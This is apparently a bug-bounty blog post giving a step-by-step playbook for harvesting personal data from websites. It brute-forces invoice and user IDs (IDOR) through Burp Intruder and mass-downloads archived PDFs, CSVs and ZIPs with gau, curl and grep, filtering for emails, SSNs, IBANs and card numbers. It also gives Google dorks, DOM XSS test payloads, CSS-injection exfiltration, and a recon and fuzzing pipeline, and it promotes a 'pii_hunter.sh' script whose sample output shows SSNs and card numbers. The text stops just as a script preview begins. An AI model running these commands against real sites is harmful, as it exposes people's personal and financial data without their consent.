## 🔍 Full Blueprint:
>How to Hunt & Reproduce PII/Data Leaks Like a Pro
Whether you're chasing juicy bounties or performing red team recon, this post gives you a battle-tested strategy to detect PII leaks, exposed invoices, weak APIs, DOM XSS, and more — step-by-step.

### ✅ 1. 🕵️‍♂️ Mass PII Exposure (Billing, Address, Payments, Personal Info)
🎯 Targeted Directories & Endpoints:
```
Pages: /invoices/, /billing/, /account/, /payment/, /orders/, /checkout/
APIs: /api/user, /api/invoice, /api/payment-method, /api/download
```
#### A. IDORs on User-Specific Endpoints
Many websites assign numeric IDs to invoices, statements, etc.

```
GET /api/invoice?id=1001
GET /account/billing/1002
```
#### 🧠 How to Exploit:

Use Burp Suite > Repeater or Intruder

Brute force IDs

If responses return other users’ data = 🔥 critical PII leak

💡 No auth required = jackpot.
💥 If JWT/auth token doesn’t block you, even better.

#### B. Exposed PDF/CSV/ZIP via Archive URLs
```
gau http://target.com | grep -Ei "\.pdf|\.csv|\.zip" > files.txt
cat files.txt | xargs -I % curl -s "%" | \
grep -Ei "email|iban|address|card|amount|name|ssn"
```
> 🧠 Why it works: Many companies don’t protect old downloadable invoices. These files often live in wp-content, uploads, or /files/.

#### C. Google Dorks for Leaked Docs
Use these to passively recon leaked billing data:

```
site:target.com inurl:invoice filetype:pdf
site:target.com inurl:billing filetype:csv
site:target.com confidential filetype:zip
```
💡 You’ll often find:

Invoices with names/addresses
Finance reports
Exported databases
HR documents

### ✅ 2. Account Takeover via DOM XSS & CSS Injection
🔎 DOM XSS Hunting Tools:
`XSStrike` `Burp Suite DOM Invader`

Manual inspection of JS sinks: `location.hash`, `document.URL`, etc.

Test Payloads:
```
"><script>alert(document.domain)</script>
"><img src=x onerror=alert('XSS')>
```
Inject into:

```
https://target.com/#/account?user="><script>...
https://target.com/?next="><img...
```
🧥 CSS Injection → Data Exfil
If user-controllable styles exist (themes, names, etc):
Inject malicious CSS into profile names, signatures, etc.

Use: `https://github.com/mwrlabs/css-exfil`

### ✅ 3. Full Recon Strategy for Sensitive Leak Mapping
Step-by-step pipeline:
```
subfinder -d target.com -o subs.txt
cat subs.txt | httpx -paths /billing,/account,/api/user,/invoice -mc 200 -title > live_targets.txt
```
Then brute for endpoints:

```
ffuf -u https://site.com/FUZZ -w endpoints.txt -mc 200 -o hits.json
```
✅ Custom Wordlist:
Use `SecLists/Fuzzing/endpoints-fuzz.txt` + your own:

```
invoice, contract, download, report, users, info, details, payroll, dashboard
```
### ✅ 4. Payload Automation (Burp/Intruder)
Automate fuzzing across IDs like invoice_id, user_id
Payloads: 1000–9999, or UUIDs if applicable

Grep Match:

`"email"`
`"amount"`
`"iban"`
`"zip"`
`"ssn"`

📌 Why it’s critical: Even one exposed invoice PDF with valid info = bounty-worthy.

✅ Bonus: What to Report
High-Impact Findings Include:

🔓 Exposed `/api/invoice?id=1001` showing full billing info

📂 Public ZIPs or PDFs with 100+ users

🧨 DOM XSS in `billing.js` or user dashboards

🗃️ Firebase storage leaking `/users.json`

📝 Leaked CSVs in `/uploads/private/`

🛠️ Tool Spotlight: PII Hunter by @cybersecplayground
Quickly automate all of the above with:

```
chmod +x pii_hunter.sh
./pii_hunter.sh http://target.com
```
🔍 Example Output:
```
[*] Scanning files for PII indicators (email, address, SSN, card)...
downloads/users.csv: john.doe@example.com, 1234-5678-9999-0000, 90210
downloads/invoice_2023.pdf: Jane Smith, 1 Main Street, SSN: 123-45-6789
```
🔥 Found sensitive data? You just earned yourself a bounty.

🧠 Script Preview:
```
